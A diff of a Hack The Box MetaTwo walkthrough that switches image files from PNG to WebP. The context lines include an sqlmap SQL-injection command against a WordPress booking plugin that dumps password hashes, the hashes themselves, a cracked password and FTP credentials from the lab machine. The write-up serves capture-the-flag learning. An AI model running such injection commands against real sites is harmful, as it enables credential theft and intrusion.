@@ -2,7 +2,7 @@
 
 A writeup for the machine [MetaTwo](https://app.hackthebox.com/machines/MetaTwo) on Hack The Box.
 
-<Image src={require("./banner.png").default} height="500" />
+<Image src={require("./banner.webp").default} height="500" />
 
 ## Footprinting
 
@@ -10,13 +10,13 @@ A writeup for the machine [MetaTwo](https://app.hackthebox.com/machines/MetaTwo)
 
 By scanning with nmap we can find three open ports. In particular, on port 80 there is a website available based on Wordpress at the address `metapress.htb`
 
-<Image src={require("./nmap.png").default} />
+<Image src={require("./nmap.webp").default} />
 
 ### Web server
 
 By looking to the source code of the index it is possible to see that the website uses Wordpress.
 
-<Image src={require("./source.png").default} />
+<Image src={require("./source.webp").default} />
 
 ## User flag
 
@@ -52,7 +52,7 @@ Get password of admin and manager users
 sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --sql-query "SELECT user_pass FROM wp_users WHERE ID=1"
 ```
 
-<Image src={require("./sqlmap.png").default} />
+<Image src={require("./sqlmap.webp").default} />
 
 Final hashes
 
@@ -63,7 +63,7 @@ $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 manager
 
 Using hashcat and the rockyou list is possible to find the password for manager: `partylikearockstar`.
 
-<Image src={require("./manager.png").default} />
+<Image src={require("./manager.webp").default} />
 
 Once inside we can try to exploit the permissions of the manager user.
 We can use tool like Wappalyzer to find the version of Wordpress used by the website (5.6.2).
@@ -108,7 +108,7 @@ define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
 ...
 ```
 
-<Image src={require("./ftp.png").default} />
+<Image src={require("./ftp.webp").default} />
 
 In addition to the blog files, there is also a folder called `mailer` where we can find a file `send_email.php`.
 Inside the file we can find the credentials for the mail server:
